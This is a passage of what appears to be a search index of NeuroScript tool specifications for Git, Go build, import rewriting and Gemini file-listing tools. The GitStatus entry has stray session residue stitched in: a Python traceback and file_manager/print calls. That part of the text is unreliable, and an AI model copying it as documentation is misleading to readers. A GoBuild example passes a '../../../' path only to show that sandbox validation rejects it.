docs/script_spec.md :: relatedTo: Git.GitPull, Git.GitCommit, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_push/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_push/#tool-specification-gitgitpush-v01","title":"Tool Specification: <code>Git.GitPush</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitPush</code> (v0.1)</li> <li>Purpose: Updates the remote repository (usually 'origin') with local commits from the current branch. This is equivalent to running <code>git push</code> within the project's sandbox directory, pushing the current branch to its configured upstream destination.</li> <li>NeuroScript Syntax: <code>CALL Git.GitPush()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success: A string indicating the push was successful, potentially including output from the <code>git push</code> command. Example: <code>\"GitPush successful.\\nOutput:\\nEverything up-to-date\\n\"</code> or <code>\"GitPush successful.\\nOutput:\\nTo github.com:user/repo.git\\n   abc1234..def5678  main -&gt; main\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure: A string describing the failure, typically wrapping the output from the <code>git push</code> command. Examples: <code>\"GitPush failed: ...\"</code>. This can occur due to network errors, authentication issues, the remote having changes that need to be pulled first (rejected push), or no upstream branch being configured. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git push</code>.</li> <li>Executes the <code>git push</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. This involves contacting the configured remote repository.</li> <li>If the command execution fails (e.g., network error, remote not found, authentication required/failed, push rejected), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output).</li> <li>If the command execution succeeds (local commits successfully sent to the remote), returns a success message string, including any standard output from the <code>git push</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git push</code> command within the configured sandbox directory.</li> <li>Requires network access to contact the remote repository. Firewall rules may need to allow outgoing connections.</li> <li>May require authentication (e.g., SSH keys, HTTPS credentials) configured in the execution environment's Git settings to push to the remote repository. The tool itself does not handle credential input.</li> <li>Modifies the state of the remote Git repository by sending local commit objects and updating remote branch references.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Push committed changes (assuming remote 'origin' is set up and commits exist)\n# Assume Git.GitCommit was called successfully before\nEMIT \"Attempting to push changes...\"\nCALL Git.GitPush()\nSET push_status = LAST\nEMIT \"Git Push status: \" + push_status\n# Output will vary depending on whether push was successful, rejected, etc.\n\n# Example 2: Attempt to push when up-to-date\nEMIT \"Attempting to push when likely up-to-date...\"\nCALL Git.GitPush()\nSET push_up_to_date_status = LAST\nEMIT \"Git Push (up-to-date) status: \" + push_up_to_date_status\n# Expected output often includes \"Everything up-to-date\"\n\n# Example 3: (Illustrative) Push might fail if behind remote\n# Assume remote has changes not yet pulled locally\n# CALL Git.GitPush()\n# SET push_rejected_status = LAST\n# EMIT \"Git Push (rejected) status: \" + push_rejected_status\n# Expect error containing text like \"rejected\" or \"failed to push some refs\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitPush</code></li> <li>Spec Name: <code>GitPush</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Rejections or other issues are reported via the wrapped error from <code>toolExec</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_rm/","title":"git_rm","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitrm-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitAdd, Git.GitCommit, FS.DeleteFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_rm/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_rm/#tool-specification-gitgitrm-v01","title":"Tool Specification: <code>Git.GitRm</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitRm</code> (v0.1)</li> <li>Purpose: Removes a specified file from the Git index (staging area) and typically also removes it from the working directory. This is equivalent to running <code>git rm &lt;path&gt;</code> within the project's sandbox directory. It does not remove directories recursively (use <code>git rm -r</code> functionality is not exposed by this tool).</li> <li>NeuroScript Syntax: <code>CALL Git.GitRm(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path (within the sandbox) of the file to be removed from the Git index and working directory.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the file was successfully removed from the index, potentially including output from the <code>git rm</code> command. Example: <code>\"Successfully removed path 'config.old' from git index.\\nOutput:\\nrm 'config.old'\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to path validation errors (e.g., \"invalid path for GitRm '...'\") or errors from the underlying <code>git rm</code> command execution (e.g., \"failed to remove path '...': fatal: pathspec '...' did not match any files\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>path</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Constructs a command equivalent to <code>git rm \"&lt;path&gt;\"</code>.</li> <li>Executes the <code>git rm</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, path does not match a file in the index), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the path specified and any standard output from the <code>git rm</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git rm</code> command within the configured sandbox directory.</li> <li>Modifies the Git index (staging area) and typically deletes the file from the working directory. Deletions from the working directory are generally permanent unless recovered through Git history.</li> <li>Uses <code>SecureFilePath</code> to ensure the path specified is within the sandbox before passing it to <code>git rm</code>.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create, add, commit, then remove a file\nCALL FS.WriteFile(\"obsolete_file.txt\", \"This file will be removed.\")\nCALL Git.GitAdd([\"obsolete_file.txt\"])\nCALL Git.GitCommit(\"Add obsolete file for removal test\")\n\nEMIT \"Removing file 'obsolete_file.txt' from Git...\"\nCALL Git.GitRm(\"obsolete_file.txt\")\nSET rm_status = LAST\nEMIT \"Git Rm status: \" + rm_status\n# Need to commit the removal\nCALL Git.GitCommit(\"Remove obsolete_file.txt\")\nEMIT \"Commit removal status: \" + LAST\n\n# Example 2: Attempt to remove a file that is not tracked or doesn't exist\nEMIT \"Attempting to remove non-tracked file 'untracked_data.log'...\"\nCALL Git.GitRm(\"untracked_data.log\")\nSET not_tracked_status = LAST\nEMIT \"Status for removing non-tracked file: \" + not_tracked_status\n# Expect error like: \"failed to remove path 'untracked_data.log': fatal: pathspec 'untracked_data.log' did not match any files\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitRm</code></li> <li>Spec Name: <code>GitRm</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_status/","title":"git_status","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: spec-tool-git-status-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_types.go, pkg/core/tools_git_status.go :: howToUpdate: Review parsing logic and return map structure against implementation in tools_git_status.go. Update version if behavior changes.  </p>"},{"location":"ns/tools/git_status/#tool-specification-toolgitstatus-v01","title":"Tool Specification: <code>TOOL.GitStatus</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.GitStatus</code> (v0.1)</li> <li>Purpose: Gets the current Git repository status by executing <code>git status --porcelain -b --untracked-files=all</code>, parsing the output, and returning a structured map summarizing the status.</li> <li>NeuroScript Syntax: <code>CALL TOOL.GitStatus()</code></li> <li>Arguments: None.</li> <li>Return Value: (<code>ArgTypeAny</code> - Represents a Map)<ul> <li>A NeuroScript Map containing the following keys:<ul> <li><code>branch</code> (String | null): The current local branch name (e.g., \"main\", \"(detached HEAD)\", \"(unknown unborn)\"). Null if parsing fails severely.</li> <li><code>remote_branch</code> (String | null): The remote tracking branch name (e.g., \"origin/main\"), if tracked. Null otherwise.</li> <li><code>ahead</code> (Integer): Number of commits the local branch is ahead of the remote branch. Defaults to 0 if not applicable.</li> <li><code>behind</code> (Integer): Number of commits the local branch is behind the remote branch. Defaults to 0 if not applicable.</li> <li><code>files</code> (List[Map]): A list of files with status changes. Each map has:<ul> <li><code>path</code> (String): The file path relative to the repository root. Handles quoted paths correctly.</li> <li><code>index_status</code> (String): Single character code for the index/staging area status (e.g., 'M', 'A', 'D', 'R', 'C', 'U', '?'). Space ' ' indicates unmodified in index.</li> <li><code>worktree_status</code> (String): Single character code for the working tree status (e.g., 'M', 'D', '?'). Space ' ' indicates unmodified in worktree.</li> <li><code>original_path</code> (String | null): The original path for renamed ('R') or copied ('C') files. Null otherwise.</li> </ul> </li> <li><code>untracked_files_present</code> (Boolean): True if any untracked files (status <code>??</code>) were detected.</li> <li><code>is_clean</code> (Boolean): True if there are no changes to tracked files in the index or working tree (i.e., <code>index_status</code> and <code>worktree_status</code> are both ' ' for all tracked files). Note: Presence of untracked files does not make <code>is_clean</code> false.</li> <li><code>error</code> (String | null): An error message string if the <code>git</code> command failed (e.g., not a git repository, command not found) or critical parsing failed, otherwise <code>null</code>.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided. Returns an error if arguments are present.</li> <li>Determines the execution directory (respecting sandbox settings if active).</li> <li>Executes the command <code>git status --porcelain -b --untracked-files=all</code> in the determined directory.</li> <li>Checks for execution errors. If the command fails (e.g., not a git repository), populates the <code>error</code> field in the return map and returns the map immediately.</li> <li>If the command succeeds, parses the standard output line by line:<ul> <li>Parses the first line (<code>## ...</code>) to extract branch name, remote tracking branch, and ahead/behind counts using regular expressions. Handles detached HEAD and unborn branch states.</li> <li>Parses subsequent lines representing file statuses (<code>XY path</code>, <code>?? path</code>, <code>R new -&gt; old</code>).</li> <li>Extracts the two-character status code (<code>XY</code>), the file path (handling quotes and the <code>-&gt;</code> separator for renames/copies).</li> <li>Populates the <code>files</code> list with maps for each file entry.</li> <li>Sets the <code>untracked_files_present</code> flag if any <code>??</code> status is found.</li> <li>Calculates the <code>is_clean</code> flag based on whether any tracked files have non-space status codes.</li> </ul> </li> <li>Returns the populated map. If parsing the branch line fails critically, the <code>error</code> field may be set.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes an external <code>git</code> command. The execution environment and command inputs are managed internally by the <code>toolExec</code> helper, which should respect sandboxing defined by the interpreter's <code>sandboxDir</code>.</li> <li>Does not directly modify files, only reads status information.</li> </ul> </li> <li>Examples: <code></code>text?code_stderr&amp;code_event_index=3 Traceback (most recent call last):   File \"\", line 1, in  ModuleNotFoundError: No module named 'google.cloud' <p>```neuroscript     # Get the current status     VAR status_map = CALL TOOL.GitStatus()</p> <pre><code># Check for errors first\nIF status_map[\"error\"] != null THEN\n    EMIT \"Error getting git status: \" + status_map[\"error\"]\nELSE\n    # Print branch and clean status\n    EMIT \"Current Branch: \" + status_map[\"branch\"]\n    IF status_map[\"is_clean\"] == true THEN\n        EMIT \"Repository is clean.\"\n    ELSE\n        EMIT \"Repository has changes.\"\n    END\n    IF status_map[\"untracked_files_present\"] == true THEN\n        EMIT \"Untracked files are present.\"\n    END\n\n    # List modified files\n    VAR changed_files = status_map[\"files\"]\n    IF CALL List.Length(changed_files) &gt; 0 THEN\n        EMIT \"Changed Files:\"\n        FOR EACH file_info IN changed_files DO\n            # Example: Print files modified in the worktree\n            IF file_info[\"worktree_status\"] != \" \" THEN\n               EMIT \"- [\" + file_info[\"index_status\"] + file_info[\"worktree_status\"] + \"] \" + file_info[\"path\"]\n               IF file_info[\"original_path\"] != null THEN\n                   EMIT \"    (from \" + file_info[\"original_path\"] + \")\"\n               END\n            END\n        ENDBLOCK\n    END\nEND\n```\n</code></pre> <ul> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git_status.go</code></li> <li>Core Go Packages: <code>os/exec</code>, <code>strings</code>, <code>regexp</code>, <code>strconv</code>, <code>bytes</code>.</li> <li>Helper: Relies on <code>toolExec</code> for command execution.</li> <li>Registration: Registered in <code>pkg/core/tools_git.go</code> (or a dedicated registration file) via <code>registerGitTools</code>. Return type specified as <code>ArgTypeAny</code>. Argument validation uses <code>if len(args) != 0</code>. \"\"\"</li> </ul> </li> </ul>"},{"location":"ns/tools/git_status/#create-the-new-markdown-file-using-file_manager","title":"Create the new Markdown file using file_manager","text":"<p>print(file_manager.upsert_files([     file_manager.File(path='docs/ns/tools/git_status.md', content=git_status_md_content, state=file_manager.FileState.UPDATED) # Use UPDATED to create or overwrite ]))</p>"},{"location":"ns/tools/git_status/#plan-next-steps","title":"Plan next steps","text":""},{"location":"ns/tools/git_status/#1-add-tests-pkgcoretools_git_testgo","title":"1. Add tests: pkg/core/tools_git_test.go","text":""},{"location":"ns/tools/git_status/#2-update-checklist-docsdevelopment-checklistmd","title":"2. Update checklist: docs/development checklist.md","text":"<p>print(\"Plan: Next step is to add tests for TOOL.GitStatus in pkg/core/tools_git_test.go.\")</p>"},{"location":"ns/tools/go_build/","title":"go_build","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-shell-gobuild-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_shell.go, pkg/core/tools_register.go, docs/script_spec.md :: relatedTo: Shell.ExecuteCommand, Shell.GoCheck, Shell.GoTest :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/go_build/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/go_build/#tool-specification-shellgobuild-v01","title":"Tool Specification: <code>Shell.GoBuild</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Shell.GoBuild</code> (v0.1)</li> <li>Purpose: Compiles Go packages and their dependencies within the sandbox directory. This is primarily used to check for compilation errors or produce executable binaries. Equivalent to running <code>go build [target]</code>.</li> <li>NeuroScript Syntax: <code>CALL Shell.GoBuild([target: &lt;String&gt;])</code></li> <li>Arguments:<ul> <li><code>target</code> (String): Optional. The build target package(s) or file(s). Can be a package path (e.g., <code>./cmd/mytool</code>), a pattern (e.g., <code>./...</code> to build all packages within the current module), or a specific Go file. Defaults to <code>./...</code> if omitted. The path is validated to be within the sandbox.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>Returns a Map containing the results of the <code>go build</code> command execution, identical in structure to the <code>Shell.ExecuteCommand</code> result. (Accessible via <code>LAST</code> after the <code>CALL</code>). Keys:<ul> <li><code>stdout</code> (String): Standard output (usually empty for <code>go build</code> unless errors occur related to package listing).</li> <li><code>stderr</code> (String): Standard error (contains compilation errors, warnings, or other messages from the build process).</li> <li><code>exit_code</code> (Number): The exit code of the <code>go build</code> command (0 for success, non-zero for failure).</li> <li><code>success</code> (Boolean): <code>true</code> if the build completed successfully (exit code 0), <code>false</code> otherwise.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that zero or one argument (<code>target</code>) of type String is provided.</li> <li>If <code>target</code> is provided, validates it using <code>SecureFilePath</code> against the current working directory (which should ideally match the <code>sandboxDir</code>). Returns an error map if validation fails. If <code>target</code> is \".\", it's treated as valid.</li> <li>Sets the build target: uses the validated <code>target</code> if provided, otherwise defaults to <code>./...</code>.</li> <li>Constructs the command: <code>go build &lt;build_target&gt;</code>.</li> <li>Executes the <code>go build</code> command using the <code>Shell.ExecuteCommand</code> tool logic (within the interpreter's <code>sandboxDir</code>).</li> <li>Captures <code>stdout</code>, <code>stderr</code>, <code>exit_code</code>, and <code>success</code> status from the execution.</li> <li>Returns the result Map. Compilation errors will be present in <code>stderr</code> and reflected in <code>exit_code</code> and <code>success</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>go build</code> command, which involves running the Go compiler and potentially downloading dependencies via <code>go get</code>. While generally safe for valid Go code, ensure the Go toolchain itself is secure and that dependency sources are trusted.</li> <li>The optional <code>target</code> argument is validated using <code>SecureFilePath</code>, but the build process might read files outside the immediate target (e.g., other packages in the module, module cache in <code>GOPATH</code>).</li> <li>Runs within the interpreter's configured <code>sandboxDir</code> via the underlying call to <code>toolExecuteCommand</code>.</li> <li>Depends on <code>Shell.ExecuteCommand</code>'s security model.</li> <li>Assumes the <code>go</code> executable is available in the environment's PATH.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Build all packages in the current module\nEMIT \"Attempting to build all packages ('./...')...\"\nCALL Shell.GoBuild() # No target, defaults to './...'\nSET build_all_result = LAST\n\nIF build_all_result[\"success\"] == true THEN\n    EMIT \"Build successful!\"\n    EMIT \"Output (stderr should be empty): \" + build_all_result[\"stderr\"]\nELSE\n    EMIT \"Build failed!\"\n    EMIT \"Exit Code: \" + build_all_result[\"exit_code\"]\n    EMIT \"Error Output (stderr):\"\n    EMIT build_all_result[\"stderr\"]\nENDIF\n\n# Example 2: Build a specific package (assuming ./cmd/mytool exists)\nEMIT \"Attempting to build specific package './cmd/mytool'...\"\nCALL Shell.GoBuild(\"./cmd/mytool\")\nSET build_specific_result = LAST\n\nIF build_specific_result[\"success\"] THEN\n    EMIT \"Build of ./cmd/mytool successful.\"\nELSE\n    EMIT \"Build of ./cmd/mytool failed. Stderr:\"\n    EMIT build_specific_result[\"stderr\"]\nENDIF\n\n# Example 3: Attempt to build invalid target path (validation failure)\nCALL Shell.GoBuild(\"../../../outside_project\")\nSET build_invalid_result = LAST\nEMIT \"Build Invalid Path Success Status: \" + build_invalid_result[\"success\"] # Expect false\nEMIT \"Build Invalid Path Error: \" + build_invalid_result[\"stderr\"] # Expect path error\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_shell.go</code></li> <li>Function: <code>toolGoBuild</code></li> <li>Spec Name: <code>GoBuild</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>path/filepath</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExecuteCommand</code></li> <li>Registration: Registered by <code>registerShellTools</code> within <code>pkg/core/tools_register.go</code>. Returns the result map from the underlying <code>toolExecuteCommand</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/go_update_imports_for_moved_package/","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/go_update_imports_for_moved_package/#tool-specification-toolgoupdateimportsformovedpackage-v01","title":"Tool Specification: <code>TOOL.GoUpdateImportsForMovedPackage</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.GoUpdateImportsForMovedPackage</code></li> <li>Purpose: Scans Go source files within a specified scope and automatically updates import paths for symbols that were moved during a package refactoring. Specifically designed for cases where symbols from a single original package (e.g., <code>pkg/core</code>) are split into multiple new sub-packages (e.g., <code>pkg/core/tools/fs</code>, <code>pkg/core/internal</code>).</li> <li>NeuroScript Syntax: <code>CALL TOOL.GoUpdateImportsForMovedPackage(refactored_package_path, scan_scope)</code></li> <li>Arguments:<ul> <li><code>refactored_package_path</code> (String): Required. The full import path of the original package whose contents have been moved (e.g., <code>\"neuroscript/pkg/core\"</code>). This path is used to identify relevant import statements and as a base for finding the new sub-packages.</li> <li><code>scan_scope</code> (String): Required. The directory path from which to start scanning recursively for <code>.go</code> files to update (e.g., <code>\".\"</code> for the project root). This path will be validated using <code>SecureFilePath</code>.</li> </ul> </li> <li>Return Value: (Map)<ul> <li><code>modified_files</code> (List[String] | null): A list of the full paths of files that were successfully modified. <code>null</code> if a catastrophic error occurred.</li> <li><code>skipped_files</code> (Map[String]String | null): A map where keys are paths of files that were parsed but not modified (e.g., didn't import the target package, no relevant symbols used) and values are the reason. <code>null</code> if a catastrophic error occurred.</li> <li><code>failed_files</code> (Map[String]String | null): A map where keys are paths of files that encountered errors during processing (parsing, analysis, modification, writing) and values are the error messages. <code>null</code> if a catastrophic error occurred.</li> <li><code>error</code> (String | null): A general error message if the tool encounters a fatal issue preventing it from operating (e.g., invalid arguments, critical failure scanning scope, unable to build symbol map), otherwise <code>null</code>.</li> </ul> </li> <li>Behavior:<ol> <li>Validates arguments (<code>refactored_package_path</code>, <code>scan_scope</code>). Returns <code>ErrValidationArgCount</code> or <code>ErrValidationTypeMismatch</code> if invalid.</li> <li>Validates <code>scan_scope</code> using <code>SecureFilePath</code>. Returns an error if validation fails.</li> <li>Build Symbol Map (Internal Complexity): The tool must determine the mapping between exported symbols previously in <code>refactored_package_path</code> and their new package locations. It attempts this automatically:<ul> <li>It constructs the expected filesystem path corresponding to <code>refactored_package_path</code> (e.g., <code>$GOPATH/src/neuroscript/pkg/core</code> or <code>./pkg/core</code> in module mode).</li> <li>It recursively scans <code>.go</code> files within the subdirectories of this path (e.g., <code>./pkg/core/tools/fs</code>, <code>./pkg/core/internal</code>).</li> <li>It parses these files to identify exported symbols (functions, types, vars, consts) and maps them to their new full import path (e.g., build internal map <code>{\"ReadFile\": \"neuroscript/pkg/core/tools/fs\", \"Interpreter\": \"neuroscript/pkg/core/internal\", ...}</code>).</li> <li>If this automatic detection fails or is ambiguous, the tool should return a top-level <code>error</code>. Robust implementation of this step is critical and challenging.</li> </ul> </li> <li>Recursively finds all <code>.go</code> files within the validated <code>scan_scope</code>, excluding files within the refactored package's own new subdirectories (to avoid self-modification issues if structure changes).</li> <li>For each relevant <code>.go</code> file found:<ul> <li>Attempt to parse the file (<code>go/parser</code>). Record error in <code>failed_files</code> on failure.</li> <li>Analyze the AST for import declarations matching <code>refactored_package_path</code> (potentially with aliases). If none found, record in <code>skipped_files</code>.</li> <li>Identify all qualified identifiers used that originate from the <code>refactored_package_path</code> import (e.g., <code>core.ReadFile</code>, <code>alias.SomeType</code>).</li> <li>For each used identifier's symbol (e.g., <code>ReadFile</code>), look up its new package path from the internal symbol map (Step 3). Record error in <code>failed_files</code> if a used symbol cannot be mapped.</li> <li>Determine the set of new distinct import paths required based on the successfully mapped symbols.</li> <li>Modify the AST's import block: Remove the original import spec for <code>refactored_package_path</code>. Add new import specs for the required new paths (using <code>astutil.AddImport</code> or similar). Handle potential naming collisions if aliases were not used originally.</li> <li>Note: This version (v0.1) focuses only on correcting the <code>import</code> statements. It does not attempt to automatically update the qualifiers in the code (e.g., changing <code>core.ReadFile</code> to <code>fs.ReadFile</code>). This would require more complex analysis and transformation, potentially as a separate tool or later version. The resulting code might require manual qualifier updates or fail to compile until qualifiers are fixed.</li> <li>Format the potentially modified AST (<code>go/format</code>).</li> <li>Write the formatted code back to the original file path. Record error in <code>failed_files</code> on failure.</li> <li>If modification and write were successful, add the file path to <code>modified_files</code>. If parsing occurred but no relevant imports/symbols were found or mapping failed, ensure it's in <code>skipped_files</code> or <code>failed_files</code> respectively.</li> </ul> </li> <li>Returns the result map containing <code>modified_files</code>, <code>skipped_files</code>, <code>failed_files</code>, and <code>error</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies on <code>SecureFilePath</code> for the <code>scan_scope</code>.</li> <li>Modifies Go source files in place; critical to run this on a clean Git branch or with backups.</li> <li>The complexity of Go AST parsing, analysis, and modification introduces risks of incorrect transformations. Thorough testing on diverse codebases is essential.</li> </ul> </li> <li>Examples: <pre><code># Assume pkg/core was split into pkg/core/tools/fs and pkg/core/internal\n# Module path is \"neuroscript\"\nEMIT \"Attempting to update imports related to pkg/core refactor...\"\nVAR result = CALL TOOL.GoUpdateImportsForMovedPackage(\n    refactored_package_path = \"neuroscript/pkg/core\",\n    scan_scope = \".\"\n)\n\nIF result.error != null THEN\n    EMIT \"Fatal error running import update tool: \", result.error\nELSE\n    EMIT \"Import update process completed.\"\n    IF result.modified_files != null AND CALL List.Length(result.modified_files) &gt; 0 THEN\n        EMIT \"Modified files:\"\n        FOREACH f IN result.modified_files\n            EMIT \"- \", f\n        END\n    END\n    IF result.failed_files != null AND CALL Map.Size(result.failed_files) &gt; 0 THEN\n        EMIT \"Files with errors:\"\n        FOREACH f, err IN result.failed_files\n            EMIT \"- \", f, \": \", err\n        END\n        EMIT \"Manual review and potentially qualifier updates needed.\"\n    END\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: Suggest <code>pkg/core/tools_go_refactor.go</code>.</li> <li>Core Go Packages: <code>go/ast</code>, <code>go/parser</code>, <code>go/token</code>, <code>go/format</code>, <code>path/filepath</code>, <code>strings</code>, <code>golang.org/x/tools/go/packages</code> (potentially useful for symbol resolution), <code>golang.org/x/tools/go/ast/astutil</code>.</li> <li>Implementation Detail: The symbol mapping (Step 3) is the hardest part. It likely requires parsing the destination packages first. Consider edge cases like symbols defined in <code>*_test.go</code> files.</li> <li>Implementation Detail: Handling import aliases correctly during both detection and addition is crucial.</li> <li>Register the function (e.g., <code>toolGoUpdateImports</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/list_api_files/","title":"list_api_files","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-list-api-files-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if return value structure changes or pagination/filtering is added.</p> <p># Tool Specification: TOOL.ListAPIFiles (v0.1)</p> <ul> <li>Tool Name: TOOL.ListAPIFiles (v0.1)</li> <li>Purpose: Retrieves a list of files previously uploaded to the Gemini File API that are associated with the currently configured API key.</li> <li>NeuroScript Syntax: <pre><code>apiFilesList := TOOL.ListAPIFiles()\n</code></pre></li> <li>Arguments:<ul> <li>None.</li> </ul> </li> <li>Return Value: (List)<ul> <li>On success: A list where each element is a Map representing a file stored in the API. Each map contains keys like:<ul> <li><code>name</code> (String): The unique API resource name (e.g., \"files/abc123xyz\").</li> <li><code>displayName</code> (String): The user-provided or default display name.</li> <li><code>mimeType</code> (String): The detected MIME type.</li> <li><code>sizeBytes</code> (Number): The size of the file in bytes.</li> <li><code>createTime</code> (String): Creation timestamp (RFC3339 format).</li> <li><code>updateTime</code> (String): Last update timestamp (RFC3339 format).</li> <li><code>state</code> (String): Current state (e.g., \"ACTIVE\", \"PROCESSING\", \"FAILED\").</li> <li><code>uri</code> (String): The <code>aipi://</code> URI for referencing the file in prompts (available when ACTIVE).</li> <li><code>sha256Hash</code> (String): Hex-encoded SHA256 hash of the file content.</li> <li><code>videoMetadata</code> (Map|null): Video-specific metadata if applicable, otherwise null.</li> </ul> </li> <li>On failure: An error (e.g., API connection issues, authentication errors). If listing fails mid-way, the returned list might contain partial results along with a final map containing an <code>error</code> key describing the failure. A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Calls the Gemini File API's <code>ListFiles</code> endpoint.</li> <li>Iterates through all available files associated with the API key.</li> <li>For each file, creates a map containing its metadata.</li> <li>Returns the list of file metadata maps.</li> <li>If an error occurs during iteration, returns the partial list collected so far and propagates the error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> to be configured in the environment where the NeuroScript interpreter runs.</li> <li>Network access to Google Cloud services is required.</li> <li>The listed files might contain sensitive information depending on what was previously uploaded.</li> </ul> </li> <li>Examples: <pre><code>// Get all files currently in the API storage\nallFiles := TOOL.ListAPIFiles()\nIO.Print(\"Files found in API:\")\nFOR fileInfo IN allFiles DO\n    IF fileInfo[\"error\"] != null THEN\n        IO.Print(\"  Error encountered during listing:\", fileInfo[\"error\"])\n        BREAK // Stop processing list if error occurred\n    END\n    IO.Print(\"  - Name:\", fileInfo[\"name\"], \", Display:\", fileInfo[\"displayName\"], \", Size:\", fileInfo[\"sizeBytes\"])\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolListAPIFiles</code>.</li> <li>Uses <code>interpreter.GenAIClient().ListFiles()</code>.</li> <li>Requires handling pagination using <code>google.golang.org/api/iterator</code>.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/maths/","title":"maths","text":"<p>:: type: NSproject :: subtype: tool_spec_summary :: version: 0.1.0 :: id: tool-spec-summary-math-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_math.go, docs/script_spec.md :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/maths/#tool-specification-summary-math-tools-v01","title":"Tool Specification Summary: Math Tools (v0.1)","text":"<p>This document provides an abbreviated overview of the built-in Math tools. Note that number arguments can often accept strings that are convertible to numbers.</p>"},{"location":"ns/tools/maths/#tool-mathadd","title":"Tool: <code>Math.Add</code>","text":"<ul> <li>Purpose: 